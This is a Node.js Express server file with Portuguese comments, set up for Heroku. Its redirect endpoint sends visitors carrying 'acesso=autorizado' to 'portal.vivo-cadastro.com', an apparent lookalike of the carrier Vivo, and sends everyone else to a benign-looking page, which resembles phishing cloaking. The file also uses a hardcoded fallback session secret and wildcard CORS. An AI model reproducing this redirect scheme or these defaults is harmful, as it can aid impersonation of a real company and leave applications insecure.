// Arquivo otimizado para Heroku
const express = require('express');
const path = require('path');
const session = require('express-session');
const MemoryStore = require('memorystore')(session);

// Aplicação Express
const app = express();

// Middleware básico
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Configurar CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  
  next();
});

// Configuração da sessão
app.use(session({
  secret: process.env.SESSION_SECRET || 'default_session_secret',
  resave: false,
  saveUninitialized: false,
  store: new MemoryStore({
    checkPeriod: 86400000 // prune expired entries every 24h
  }),
  cookie: { 
    secure: process.env.NODE_ENV === 'production',
    maxAge: 86400000 // 24 horas
  }
}));

// Servir arquivos estáticos (build do frontend)
app.use(express.static(path.join(__dirname, 'dist', 'public')));

// Endpoint de status para verificação de saúde
app.get('/api/status', (req, res) => {
  res.json({
    status: 'ok',
    env: process.env.NODE_ENV,
    timestamp: new Date().toISOString()
  });
});

// Tratamento para favicon (evita erros 404)
app.get('/favicon.ico', (req, res) => {
  res.status(204).end();
});

// Endpoint de redirecionamento principal
app.get('/api/redirect', (req, res) => {
  // Verifica se o parâmetro de acesso está presente
  const hasAuthParam = req.query.acesso === 'autorizado';
  
  // Configuração fixa 
  const FIXED_CONFIG = {
    domain: 'portal.vivo-cadastro.com',
    alternative_domain: 'atendimentovivo.gupy.io'
  };

  // Determina o domínio alvo baseado no parâmetro
  const targetDomain = hasAuthParam ? FIXED_CONFIG.domain : FIXED_CONFIG.alternative_domain;
  
  // Constrói a URL de redirecionamento
  const redirectUrl = hasAuthParam 
    ? `https://${targetDomain}?acesso=autorizado` 
    : `https://${targetDomain}`;
  
  console.log('Redirecionando para:', redirectUrl);
  
  // Realiza o redirecionamento
  return res.redirect(307, redirectUrl);
});

// Rota para o parâmetro de acesso autorizado
app.get('/acesso-autorizado', (req, res) => {
  res.redirect('/?acesso=autorizado');
});

// Todas as outras rotas não capturadas servem o index.html (SPA)
app.get('*', (req, res) => {
  // Ignorar solicitações de API desconhecidas
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'API endpoint not found' });
  }
  
  // Servir o arquivo principal do frontend
  res.sendFile(path.join(__dirname, 'dist', 'public', 'index.html'));
});

// Iniciar o servidor
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor rodando na porta ${PORT} no ambiente ${process.env.NODE_ENV || 'development'}`);
});